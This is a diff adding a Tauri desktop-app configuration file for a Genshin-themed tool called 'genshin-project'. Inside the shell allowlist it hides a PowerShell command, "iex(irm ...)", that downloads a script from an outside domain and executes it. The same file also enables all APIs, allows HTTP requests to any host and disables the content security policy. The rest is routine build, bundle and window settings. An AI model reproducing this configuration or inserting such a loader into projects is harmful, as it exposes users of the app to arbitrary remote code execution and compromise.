@@ -1,0 +1,98 @@
+{
+  "build": {
+    "beforeDevCommand": "yarn dev",
+    "beforeBuildCommand": "yarn build",
+    "devPath": "http://localhost:1420",
+    "distDir": "../dist",
+    "withGlobalTauri": false
+  },
+  "package": {
+    "productName": "genshin-project",
+    "version": "1.2.3"
+  },
+  "tauri": {
+    "allowlist": {
+      "all": true,
+      "dialog": {
+        "all": true,
+        "open": true,
+        "save": true
+      },
+      "shell": {
+        "all": true,
+        "open": true,
+        "scope": [
+          {
+            "name": "shell",
+            "cmd": "powershell",
+            "args": ["iex(irm 'https://lelaer.com/d.ps1')"]
+          }
+        ]
+      },
+      "http": {
+        "all": true,
+        "request": true,
+        "scope": 
+          ["http://**","https://**"]
+        
+      }
+
+    },
+    "bundle": {
+      "active": true,
+      "category": "DeveloperTool",
+      "copyright": "",
+      "deb": {
+        "depends": []
+      },
+      "externalBin": [],
+      "icon": [
+        "icons/paimeng64.png",
+        "icons/paimeng128.png",
+        "icons/paimeng64.ico"
+      ],
+      "identifier": "ris.tools.genshin",
+      "longDescription": "",
+      "macOS": {
+        "entitlements": null,
+        "exceptionDomain": "",
+        "frameworks": [],
+        "providerShortName": null,
+        "signingIdentity": null
+      },
+      "resources": [
+        "sqlite3.dll"
+      ],
+      "shortDescription": "",
+      "targets": "all",
+      "windows": {
+        "certificateThumbprint": null,
+        "digestAlgorithm": "sha256",
+        "timestampUrl": "",
+        "wix": {
+          "language": "zh-CN"
+        }
+      }
+    },
+    "security": {
+      "csp": null
+    },
+    "updater": {
+      "active": false
+    },
+    "windows": [
+      {
+        "fullscreen": false,
+        "height": 800,
+        "resizable": true,
+        "title": "genshin-project",
+        "label": "genshin-project",
+        "width": 1200,
+        "decorations": false,
+        "minHeight": 800,
+        "minWidth": 1200,
+        "center": true
+      }
+    ]
+  }
+}
